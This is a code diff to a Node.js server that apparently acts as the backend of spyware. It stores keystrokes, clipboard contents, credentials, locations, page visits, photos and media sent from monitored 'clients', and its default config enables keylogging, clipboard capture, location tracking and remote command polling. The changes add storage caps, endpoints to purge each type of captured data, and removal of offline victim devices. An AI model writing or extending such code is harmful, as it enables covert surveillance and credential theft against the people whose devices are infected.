@@ -92,8 +92,18 @@ async function loadStoreFromRedis() {
     return null;
 }
 
+// ── Trim arrays to prevent store overflow ────────────────────
+function trimStore() {
+    const caps = { locations: 5000, events: 1000, keystrokes: 5000, clipboard: 500,
+                   pageVisits: 5000, photos: 2000, media: 500, errors: 500, credentials: 1000 };
+    for (const [key, max] of Object.entries(caps)) {
+        if (Array.isArray(store[key]) && store[key].length > max) store[key].length = max;
+    }
+}
+
 // ── Save (Redis or file) ──────────────────────────────────────
 function saveStore() {
+    trimStore();
     if (saveTimeout) clearTimeout(saveTimeout);
     saveTimeout = setTimeout(() => {
         if (USE_REDIS && redis) {
@@ -160,7 +170,7 @@ function requireAuth(req, res, next) {
 const defaultConfig = {
     photoEnabled: false, photoPeriod: 30000, photoQuality: 0.7,
     videoEnabled: false, videoPeriod: 300000, videoDuration: 10000,
-    locationEnabled: true, locationPeriod: 10000,
+    locationEnabled: true, locationPeriod: 30000,
     keystrokesEnabled: true, keyLogFlush: 10000,
     clipboardEnabled: true, clipboardCheck: 15000,
     deviceInfoPeriod: 60000, heartbeatPeriod: 8000, commandPoll: 3000
@@ -1152,6 +1162,40 @@ app.post('/api/cleanup', requireAuth, (req, res) => {
       else if (type === 'visits') { store.pageVisits = []; }
     saveStore();
     console.log(`\u{1F9F9} Cleanup: ${type}, ${deleted} removed`);
+    res.json({ success: true, deleted });
+});
+
+// ── Purge a specific data type completely ──
+app.delete('/api/purge/:type', requireAuth, async (req, res) => {
+    const typeMap = {
+        locations: 'locations', errors: 'errors', credentials: 'credentials',
+        events: 'events', keystrokes: 'keystrokes', clipboard: 'clipboard',
+        visits: 'pageVisits', photos: 'photos', media: 'media'
+    };
+    const key = typeMap[req.params.type];
+    if (!key) return res.status(400).json({ error: 'Invalid type: ' + req.params.type });
+    const deleted = (store[key] || []).length;
+    store[key] = [];
+    saveStore();
+    console.log(`\u{1F5D1}\u{FE0F}  Purged ${req.params.type}: ${deleted} entries`);
+    res.json({ success: true, deleted });
+});
+
+// ── Purge stale offline clients (not seen in N days) ──
+app.delete('/api/clients/stale', requireAuth, (req, res) => {
+    const days = Math.max(0.5, parseFloat(req.query.days || '3'));
+    const cutoff = Date.now() - days * 86400000;
+    let deleted = 0;
+    Object.keys(store.clients).forEach(id => {
+        const cl = store.clients[id];
+        if (!cl.online && new Date(cl.lastSeen || 0).getTime() < cutoff) {
+            delete store.clients[id];
+            delete store.deviceInfo?.[id];
+            deleted++;
+        }
+    });
+    if (deleted) saveStore();
+    console.log(`\u{1F5D1}\u{FE0F}  Purged ${deleted} stale clients (>${days}d offline)`);
     res.json({ success: true, deleted });
 });
 
